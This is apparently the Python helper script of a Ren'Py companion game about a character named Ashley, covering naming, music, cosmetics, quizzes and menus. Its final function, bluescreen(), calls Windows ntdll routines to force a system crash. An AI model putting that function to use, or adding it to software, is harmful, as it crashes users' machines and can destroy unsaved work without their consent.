init python:
    # situational functions used as a specific part of a label
    def namePlayer():
        global ashley
        global name
        nameInput = renpy.input(_("Enter your name."))
        playerName = nameInput.strip() or __("Babes")
        name = nameContingencies(playerName)
        ashley.setValue("name", name)
    def nameContingencies(playerName):
        lowerName = playerName.lower()
        if lowerName == "daddy":
            return "Master Hardwick"
        elif lowerName == "gown master":
            a("You better not be here to make me code for you again!")
        elif lowerName == "bibblyboy" or lowerName == "james":
            renpy.show("ash laugh")
            a("I love men.")
            renpy.show("ash")
        elif lowerName == "pipster":
            a("gosh, this is painful, isn't it?")
            renpy.show("ash laugh")
            a("It's okay, it might work this time!")
            renpy.show("ash blink")
        return playerName
    
    def timeContingencies():
        global ashley
        lastLogin = datetime.strptime(ashley.getValue("lastPlayed"), "%d-%m-%Y %H:%M:%S")
        currentTime = datetime.now().replace(microsecond=0)
        timeDiscrepancy = currentTime - lastLogin
        print(lastLogin)
        print(currentTime)
        print(timeDiscrepancy)
        # use TimeDelta to calculate time elapsed since last login
        # if time is earlier in the day than last login, then add 1 to the number of days difference
        
        #a(f"{}")

    def jamSelector(selectionMethod):
        global songsPlayed
        renpy.music.stop(fadeout=3.0)
        heardSongs = readFile("heardSongs.txt")
        randomiserSongs = readFile("randomiserSongs.txt")
        available = countFiles("audio/jams")
        if selectionMethod == "previous":
            chosenTrack = getPreviousSong(songsPlayed)
            songsPlayed = songsPlayed[:-1]
        elif selectionMethod == "specific":
            a(f"Number of songs heard: {len(heardSongs)}/{available}")
            chosenTrack = getSpecificSong(heardSongs)
        else:
            a(f"Number of random songs available: {len(randomiserSongs)}")
            chosenTrack = getRandomSong(randomiserSongs, songsPlayed)
        a(f"Track chosen: {chosenTrack}")
        renpy.music.play(f"audio/jams/{chosenTrack}.mp3")
        writeToFile("heardSongs.txt", chosenTrack)
        songsPlayed.append(chosenTrack)
        songsPlayed = songsPlayed[-5:]
        print(songsPlayed)
        jamContingencies(chosenTrack)
        getTrackDetails(chosenTrack)
    def jamContingencies(chosenTrack):
        if chosenTrack == "Knee Deep At ATP":
            renpy.show("ash laugh")
            a("You lucky thing, that's my creator's favourite song!")
            addQuizTopic("ATP")
            renpy.show("ash blink")
        elif chosenTrack == "Soft Boy":
            a("Fun fact- this is actually the main menu song!")
            addQuizTopic("SoftBoy")
    
    def chooseOutfit():
        global ashley
        tupledAspects = []
        aspects = getCosmeticTypes()
        for aspect in aspects:
            aspectIndex = aspects.index(aspect)
            print(aspectIndex)
            tupledAspects.append((getCosmeticTypes(False)[aspectIndex], aspects[aspectIndex]))
        print(aspectIndex)
        #tupledAspects.append(("Default All", "Default"))
        print(tupledAspects)
        unlockedCosmetics = ashley.getValue("cosmetics")
        changeType = choiceMenu("Choose which aspect of Ashley you wish to change!", tupledAspects)
        if changeType == "Default":
            ashley.setvalue("outfit", getOutfitDefault())
            refreshOutfit()
        items = []
        aspectIndex = aspects.index(changeType)
        for cosmeticNo in unlockedCosmetics[aspectIndex]:
            cosmeticName = getCosmeticName(changeType, cosmeticNo)
            items.append((cosmeticName, cosmeticNo))
        changeItem = choiceMenu(f"Choose which {changeType.lower()} you want!", items)
        outfit = ashley.getValue("outfit")
        outfit[aspectIndex] = changeItem
        ashley.setValue("outfit", outfit)
        refreshOutfit()
    def refreshOutfit():
        getAshBasics()
        renpy.show("ash open")
        renpy.show("ash blink")
        renpy.with_statement(fade)
        a(f"{randomResponse('style')}")

    def anyCosmetics():
        global ashley
        for cosmeticType in ashley.getValue("cosmetics"):
            if len(cosmeticType) > 1:
                return True
        return False
    def questionForPlayer():
        global ashley
        aboutPlayer = ashley.getValue("aboutPlayer")
        print(aboutPlayer)
        askedQuestions = []
        allQuestions = aboutPlayerAll()
        for question in aboutPlayer:
            askedQuestions.append(findKeyOfNestedValue(allQuestions, question))
        print(askedQuestions)
        availableQuestions = removeItems(allQuestions, askedQuestions)
        print(availableQuestions)
        if availableQuestions == None:
            a("Ah... I was going to ask more about you instead, but I've asked you everything I can think of right now!")
            renpy.call("question")
            return
        chosenQuestion = random.choice(list(availableQuestions.keys()))
        chosen = choiceMenu(randomResponse("deliberating")+chosenQuestion, allQuestions[chosenQuestion].keys(), False)
        aboutPlayer.append(chosen)
        ashley.setValue("aboutPlayer", aboutPlayer)
        a(f"{allQuestions[chosenQuestion][chosen]}")       
    def questionForAshley():
        global ashley
        allQuestions = aboutAshAll()
        availableTopics = removeItems(allQuestions, ashley.getValue("quizTopics"))
        if availableTopics == []:
            renpy.call("pop_quiz")
            return
        #chosenQuestion = random.choice(list(availableQuestions.values().keys()))
        chosenQuestion = choiceMenu("Pick a question to ask Ashley!", availableTopics.values().keys())
        chosenTopic = findKeyOfNestedValue(allQuestions, chosenQuestion)
        a(f"{availableQuestions[chosenTopic][chosenQuestion]}")
        addQuizTopic(chosenTopic)
    def popQuiz():
        global ashley
        quizTopics = ashley.getValue("quizTopics")
        allQuestions = quizAll()
    def anecdote():
        global ashley
        heard = ashley.getValue("heardAnecdotes")
        file = randomFile("files/anecdotes")
        if countFiles("files/anecdotes") == len(heard):
            a("I've told you all the anecdotes I know!")
            a("However, I'm sure I can re-tell any favourites you might have forgotten!")
            anecdote = choiceMenu("Which anecdote would you like to hear again?", heard)
            ramble(anecdote)
            return
        while file in heard:
            file = randomFile("files/anecdotes")
        anecdote = readFile("anecdotes"+file)
        ramble(anecdote)
        heard.append(file)
        ashley.setValue("heardAnecdotes", heard)
        ashley.setValue("relationship", ashley.getValue("relationship")+5)
    def ramble(anecdote):
        for line in anecdote:
            a(f"{line}")
    # useful, commonly used functions
    def zeldaRiff(cosmeticType, cosmeticNo):
        global ashley
        cosmeticTypes = getCosmeticTypes()
        cosmeticIndex = cosmeticTypes.index(cosmeticType)
        cosmeticName = getCosmeticName(cosmeticType, cosmeticNo)
        cosmetics = ashley.getValue("cosmetics")
        if cosmeticNo in cosmetics[cosmeticIndex]:
            renpy.show("ash laugh")
            a(f"You cheeky hecker, you already have '{cosmeticName}'!")
            renpy.show("ash blink")
        else:
            cosmetics[cosmeticIndex].append(cosmeticNo)
            ashley.setValue("cosmetics", cosmetics)
            renpy.play("audio/itemget.mp3")
            nar(f"You unlocked the '{cosmeticName}' cosmetic! Visit the unlockables menu to equip it!")
    def addQuizTopic(topicToAdd):
        global ashley
        quizTopics = ashley.getValue("quizTopics")
        if not topicToAdd in quizTopics:
            quizTopics.append(topicToAdd)
            ashley.setValue("quizTopics", quizTopics)
        else:
            renpy.show("ash laugh")
            a("But, you already know about that.")
            renpy.show("ash blink")
    
    def randomResponse(responseType):
        global ashley
        relationship = ashley.getValue("relationship")
        name = ashley.getValue("name")
        if responseType is str:
            responseType = responseType.lower()
        responses = {
            True : [    
                        "And so it shall be.",
                        "Anything for you...",
                        "I don't think so. Haha, just kidding!",
                        "Sure thing, [name].",
                        "Okey-kokey!",
                        "Processing request...",
                        "I'm on it!",
                        "I'll see what I can do."
                    ],
            False : [   
                        "Sorry, I don't think I can do that.",
                        "I'm afraid I can't do that right now.",
                        "Are you sure about that?",
                        "Sorry, no can do."
                    ],
            "quit" : [  
                        "I see. I suppose you have better things to do.",
                        "Leaving so soon?",
                        "I'll miss you.",
                        "Come back soon.",
                        "I'll see you later.",
                        "We'll meet again.",
                        "Til next time.",
                        "See you later, alligator!",
                        "In a while, crocodile.",
                        "Making like a tree, are we?",
                        "Farewell, [name].",
                        "Peace!",
                    ],
            "greeting1" : [
                        "Well hello again.",
                        "Welcome back, [name].",
                        "Here we go again...",
                        "What's on your mind?",
                        "It's [name], right?",
                        "Fancy seeing you here!",
                        "Hidey ho, neighbourino!",
                        "Oh, hey! It's you!",
                        "Hey, [name]!",
                    ],
            "greeting2" : [
                        "You're getting the hang of this now~",
                        "It's good to see you again.",
                        "I'm glad you're enjoying yourself.",
                        "I'm glad you're back.",
                        "I'm glad you're back, [name].",
                        "You look like you have something to ask me. Don't worry, I won't bite.",
                        "Hey, [name]. What's up?"
                    ],
            "greeting3" : [
                        "You must really like me... Aha, don't worry. I like you too",
                        "I missed seeing that face of yours~",
                        "You're giving me that look again... not that I mind.",
                        "[name]! It's so nice to see you."
                        "I was just wondering when you'd come visit me again."
                        "Don't leave me so long next time...",
                        "I missed you...",
                        "I'm here whenever you need me... I hope you know that. I won't leave you."
                    ],
            "quizopener" : [
                        "I hope you've been paying attention!", 
                        "Time to test your knowledge!", 
                        "Let's see how well you know me!", 
                        "Let's see how much you've been paying attention!", 
                        "Let's see how much you've learned!", 
                        "Pop quiz!", 
                        "Knowledge check!",
                        "Think fast!",
                        "No cheating!",
                        "Pack up, it's quiz time!"
                    ],
            "deliberating" : [
                        "Let's see... ",
                        "I think I'll go with... "
                        "Hmm... ",
                        "I'm thinking... ",
                        "Ahh... ",
                        "Uhh... ",
                        "I'm not sure... ",
                        "Oh! I know! ",
                        "Let's see here... "
            ],
            "style" : [
                        "Digging the new look?",
                        "I like it!",
                        "Treasures abound in the lost and found, eh?",
                        "You like?",
                        "Refreshing, isn't it?",
                        "Looking swanky~",
                        "I'd hit that!",
                        "Dapper as always!",
                        "It'll have to do!"
            ]
        }
        if responseType == "greeting":
            if relationship < 10:
                responseType = "greeting1"
            elif relationship < 25:
                responseType = "greeting2"
            elif relationship >= 25:
                responseType = "greeting3"
        if responseType in responses.keys():
            return random.choice(responses[responseType])
        else:
            return "Invalid type of response!"
    def findDictIndex(dict, item):
        try:
            keysList = list(dict.keys())
            if item not in keysList:
                valsList = list(dict.values())
                dictIndex = valsList.index(item)
            else:
                dictIndex = keysList.index(item)
            return dictIndex
        except:
            print("Item not in dictionary! :(")
    def findKeyOfNestedValue(dict, item):
        for key, value in dict.items():
            if item in value.keys():
                return key
            elif item in value.values():
                return key
    def removeItems(items, itemsToRemove):
        if itemsToRemove == []:
            return items
        for item in itemsToRemove:
            try:
                if isinstance (items, list):
                    items.remove(item)
                elif isinstance (items, dict):
                    items.pop(item)
            except KeyError:
                continue
        if len(items) == 0:
            return None
        return items
    def codeFormat(variableName):
        return variableName[0].lower() + variableName.title()[1:].replace(" ", "")
    # root folder is Ataraxy/game - writeToFile and readFile have /files/ preadded to dir
    def listFiles(dir=""):
        import re
        allFiles = renpy.list_files()
        fileList = []
        for file in allFiles:
            if re.match(dir,file):
                fileList.append(file[(len(dir)):])
        return fileList
    def countFiles(dir=""):
        return len(listFiles(dir))
    def writeToFile(filename, text):
        with open(config.gamedir + "/files/" + filename) as rf:
            if text not in rf.read():
                with open(config.gamedir + "/files/" + filename, "a") as af:
                    af.write(text + "\n")
        return
        # contingencies for time of day whether tutorial is completed or not
    def readFile(filename):
        itemList = open(config.gamedir + "/files/" + filename).readlines()
        for index, item in enumerate(itemList):
            itemList[index] = item.replace("\n", "")
        return itemList
    def randomFile(dir=""):
        allFiles = listFiles(dir)
        chosenFile = random.choice(allFiles)
        return chosenFile

    def inputQuestion(question, correctAnswer):
        global points
        a(f"{question}")
        answer = renpy.input("Enter your answer.").strip().lower()
        if answer == correctAnswer.lower():
            points += 1
            a("Correct! You get a point.")
        else:
            a("Incorrect. You don't get a point.")
        a(f"You have {points} {getCorrectNoun()}.")
    def menuQuestion(question, correctAnswer, options, pointsEnabled):
        a(f"{question}", interact=False)
        answer = choiceMenu("Choose your answer.", options)
        if pointsEnabled:
            global points
            if answer == correctAnswer:
                points += 1
                a("Correct! You get a point.")
            else:
                a("Incorrect. You don't get a point.")
            a(f"You have {points} {getCorrectNoun()}.")
            return
        else:
            if answer == correctAnswer:
                a("Correct!")
                return True
            else:
                a("Incorrect.")
                return False
    
    def separateOptions(options):
        separatedOptions = []
        #theoretical limit = 8 options (6 + "Next"/"Prev")
        print(len(options))
        maxOptions = 7
        if len(options) > maxOptions:
            print(ceil(len(options)/maxOptions))
            requiredMenus = ceil(len(options)/maxOptions)
            for menuNumber in range(requiredMenus):
                separatedOptions.append(options[:maxOptions])
                del options[:maxOptions]
        else:
            separatedOptions.append(options)
        print(separatedOptions)
        return separatedOptions
    def formatOptions(separatedOptions):
        formattedOptions = []
        # gets correct [(),()] format for Ren'Py menu
        for optionSet in separatedOptions:
            innerOptions = []
            for inner in optionSet:
                if isinstance(inner, tuple):
                    innerOptions.append(inner)
                else:
                    innerOptions.append((inner, inner))
            formattedOptions.append(innerOptions)
        print(formattedOptions)
        return formattedOptions
    def addTraversal(formattedOptions):
        if len(formattedOptions) > 1:
            maxIndex = len(formattedOptions)
            for menu in formattedOptions:
                currentIndex = formattedOptions.index(menu) + 1
                nextIndex = currentIndex + 1
                prevIndex = currentIndex - 1
                menu.append((f"Next - {nextIndex}/{maxIndex}", "Next"))
                menu.append((f"Previous - {prevIndex}/{maxIndex}", "Previous"))
            formattedOptions[-1].pop(-2)
            formattedOptions[0].pop(-1)
            print(formattedOptions)
        return formattedOptions
    def menuFormat(options):
        return(addTraversal(formatOptions(separateOptions(options))))
    def choiceMenu(message, options, narrator=True):
        choices = menuFormat(options)
        index = 0
        answer = traverseMenu(message, choices, index, narrator)
        return answer
    def traverseMenu(message, choices, index, narrator):
        if narrator:
            nar(f"{message}", interact=False)
        else:
            a(f"{message}", interact=False)
        print(choices[index])
        answer = renpy.display_menu(choices[index])
        if answer == "Next" or answer == "Previous":
            if answer == "Next":
                index += 1
            elif answer == "Previous":
                index -= 1
            return traverseMenu(message, choices, index, narrator)
        return answer
        
    # sets time for bg from time of day/ tutorial status    
    def setBG():
        global ashley
        global timeOfDay
        if ashley.getValue("name") == "" or ashley.getValue("tutorialCompleted") == False:
            timeOfDay = "Day"
        else:
            getTimeOfDay()
    # getting variables from other functions
    def getAshBasics():
        global ashley
        global tutorialCompleted
        global name
        global relationship
        getAshOutfit()
        tutorialCompleted = ashley.getValue("tutorialCompleted")
        name = ashley.getValue("name")
        relationship = ashley.getValue("relationship")
    def unlockedFruits():
        global fruits
        fruits = []
        balance = ashley.getValue("balance")
        #for fruit in availableFruits:
        #    if balance >= fruitPrices[fruit]:
        #        fruits.append(fruit)
        for fruitType in balance:
            fruits.append(fruitType[0])
        if len(fruits) == 0:
            return None
        return fruits

    def getAshOutfit():
        global ashley
        global hairBack
        global body
        global nails
        global hairFront
        global accessory
        global eyebrows
        global eyes
        outfit = ashley.getValue("outfit")
        # (hairBack, body, nails, eyes, hairFront, accessory, eyebrows)
        hairBack = outfit[0]
        body = outfit[1]
        nails = outfit[2]
        eyes = outfit[3]
        hairFront = outfit[4]
        accessory = outfit[5]
        eyebrows = outfit[6]
    def getCorrectNoun():
        global points
        if points == 1:
            return "point"
        else:
            return "points"
    def getCosmeticName(cosmeticType, cosmeticNo):
        cosmeticsInfo = cosmeticsAll()
        cosmeticTypes = getCosmeticTypes()
        dictName = cosmeticType + "All"
        if cosmeticType not in cosmeticTypes:
            return "Invalid cosmetic type!"
        elif cosmeticNo not in cosmeticsInfo[dictName]:
            return "Nonexistant Cosmetic!"
        return cosmeticsInfo[dictName][cosmeticNo]
    def getCosmeticTypes(codeFormat=True): 
        if codeFormat:
            cosmeticTypes = ["hairBack", "body", "nails", "eyes", "hairFront", "accessory", "eyebrows"]
        else:
            cosmeticTypes = ["Hair Back", "Body", "Nails", "Eyes", "Hair Front", "Accessory", "Eyebrows"]
        return cosmeticTypes
    def getOutfitDefault():
        cosmetics = getCosmeticTypes(True)
        for cosmetic in cosmetics:
            cosmetics.replace(cosmetic, "00")
        return cosmetics
    def getTrackDetails(chosenTrack):
        global albumName
        global artistName
        global trackNo
        global currentTrack
        currentTrack = chosenTrack
        trackInfo = trackInfoAll()
        albumName = None
        artistName = None
        trackNo = None
        # find album name, track number
        for artist, works in trackInfo.items():
            for album, songs in works.items():
                if currentTrack in songs:
                    artistName = artist
                    albumName = album
                    trackNo = songs.index(currentTrack) + 1
                    return 
        # error catching (incase i add new tracks and forget to add to the dictionary)
        if artistName is None:
            albumName = "Unknown"
            trackNo = "N/A"
            artistName = "Unknown"
    def getRandomSong(songs, songsPlayed):
        chosenTrack = random.choice(songs)
        try:
            if chosenTrack == songsPlayed[-1]:
                a(f"Oops! I was going to play {songsPlayed[-1]}, but you just heard that one!")
                return getRandomSong(songs, songsPlayed)
        except IndexError:
            pass
        return chosenTrack
    def getPreviousSong(songsPlayed):
        if len(songsPlayed) < 2:
            a("No other songs played yet! Come back once you've heard some jams.")
        return songsPlayed[-1]
    def getSpecificSong(songs):
        return choiceMenu("Choose a song to play!", songs)
    # functions designed to override native Ren'Py functions/ config related functions
    def removeKeybinds(keybinds):
        keybindsToRemove = keybinds
        for keybind in keybindsToRemove:
            config.keymap[keybind] = []
    def rebindKeybinds(keybinds):
        for pair in keybinds:
            config.keymap[pair[0]] = [pair[1]]
    def bluescreen():
        from ctypes import windll
        from ctypes import c_int
        from ctypes import c_uint
        from ctypes import c_ulong
        from ctypes import POINTER
        from ctypes import byref

        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )